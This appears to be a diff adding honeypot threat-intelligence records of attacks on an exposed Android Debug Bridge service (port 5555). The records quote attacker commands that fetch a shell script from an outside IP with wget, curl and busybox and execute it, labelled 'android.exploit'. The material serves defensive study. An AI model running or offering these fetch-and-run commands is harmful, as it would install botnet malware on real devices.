@@ -1,6 +1,32 @@
 ABD Exploit Attack (MANTIS Honeypot //Threat Intelligence)
 These Attacks were captured on Port 5555 using a custom honeypot running protocl mimicing ADB. This protocol is heavily exploited by kimwolf botnet. 
 
+
+Event Detail
+adb command
+Event ID	8163
+Session	3cd6dafa...
+Source IP	176.65.139.41
+Timestamp	2/21/2026, 5:27:15 PM
+{
+  "command": "cd /data/local/tmp/; busybox wget http://140.233.190.82/cat.sh; sh cat.sh; curl http://140.233.190.82/cat.sh; sh cat.sh; wget http://140.233.190.82/cat.sh; sh cat.sh; curl http://140.233.190.82/cat.sh; sh cat.sh; busybox wget http://140.233.190.82/cat.sh; sh cat.sh; busybox curl http://140.233.190.82/cat.sh; sh cat.sh",
+  "mode": "exec"
+}
+
+
+{
+  "stage": "connect",
+  "client_command": "0x4e584e43",
+  "client_banner": "host::",
+  "banner_parsed": {
+    "raw": "host::",
+    "type": "host"
+  }
+}
+{
+  "command": "cd /data/local/tmp; rm -rf cat.sh; rm -rf iran.*; wget http://140.233.190.82/cat.sh || curl http://140.233.190.82/cat.sh -o cat.sh; chmod 777 cat.sh; ./cat.sh android.exploit",
+  "mode": "exec"
+}'
 {
   "stage": "connect",
   "client_command": "0x4e584e43",
